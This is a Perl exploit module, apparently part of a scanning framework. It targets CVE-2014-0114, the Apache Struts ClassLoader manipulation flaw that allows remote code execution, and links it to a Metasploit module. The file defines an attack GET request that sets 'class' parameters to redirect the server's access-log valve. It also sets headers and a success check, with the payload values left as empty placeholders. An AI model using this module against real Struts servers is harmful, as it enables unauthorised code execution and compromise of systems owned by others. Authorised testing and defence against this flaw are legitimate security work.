package STRUTS::MSF::StrutsCodeExecClassloader;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "StrutsCodeExecClassloader";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2014-0114",
  DESCRIPTION => "

        This module exploits a remote command execution vulnerability in Apache Struts versions

        1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with

        the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due

        to the ParametersInterceptor. Both allow access to 'class' parameter that is directly

        mapped to getClass() method and allows ClassLoader manipulation. As a result, this can

        allow remote attackers to execute arbitrary Java code via crafted parameters.

      ",
  METHOD => "GET",
  MSF_MODULE => "struts_code_exec_classloader",
  PATH => "cmd=&__CL_PREFIX__.resources.context.parent.pipeline.first.directory=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY__&__CL_PREFIX__.resources.context.parent.pipeline.first.prefix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.suffix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.fileDateFormat=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT__&",
  REFERENCES => [
    "http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/",
    "http://struts.apache.org/release/2.3.x/docs/s2-020.html",
    "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204",
    "https://github.com/rgielen/struts1filter/tree/develop",
  ],
  SHARE => "FILE_NAME",
  TITLE => "Apache Struts ClassLoader Manipulation Remote Code Execution",
  VARIABLES => {
    '__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX' =>       { DESCRIPTION => "", VALUE => "" },
    'CL_PREFIX' =>       { DESCRIPTION => "", VALUE => "" },
    '__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY' =>       { DESCRIPTION => "", VALUE => "" },
    '__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX' =>       { DESCRIPTION => "", VALUE => "" },
    '__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
